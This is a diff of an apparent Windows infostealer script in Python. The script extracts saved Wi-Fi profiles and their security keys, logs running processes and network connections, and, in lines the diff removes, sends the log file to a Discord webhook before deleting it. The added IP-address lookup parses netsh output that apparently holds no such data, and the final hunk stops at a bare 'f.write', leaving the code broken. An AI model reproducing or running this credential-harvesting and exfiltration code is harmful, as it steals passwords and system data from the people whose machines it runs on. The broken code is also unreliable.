@@ -68,8 +68,15 @@ def get_saved_wifi_profiles_windows():
         if 'Sicherheitsschlüssel' in profile_details:
             security_key = profile_details.split('Sicherheitsschlüssel')[-1].strip().split('\n')[0].split(':')[1].strip()
             profile_info['Security Key'] = security_key
-        # Get IP addresses for each profile (currently set to None)
-        profile_info['IP Address'] = None  # Replace with actual logic to fetch IP addresses
+        # Get IP addresses for each profile
+        ip_addresses = execute_command(f'netsh wlan show profile name="{profile}"')
+        ip_pattern = re.compile(r'IP-Adresse.*?:\s*(.*)', re.IGNORECASE)
+        match = ip_pattern.search(ip_addresses)
+        if match:
+            profile_info['IP Address'] = match.group(1).strip()
+        else:
+            profile_info['IP Address'] = 'Not available'
+            
         wifi_profiles.append(profile_info)
 
     return wifi_profiles
@@ -223,11 +230,4 @@ with open(log_file_path, 'w') as f:
     f.write("=== Running Processes ===\n")
     f.write(f"{running_processes}\n")
 
-    f.write("=== Network Connections ===\n")
-    f.write(f"{network_connections}\n")
-
-# Send log.txt content to Discord webhook
-send_to_discord(log_file_path)
-
-# Delete log.txt after sending
-os.remove(log_file_path)
+    f.write
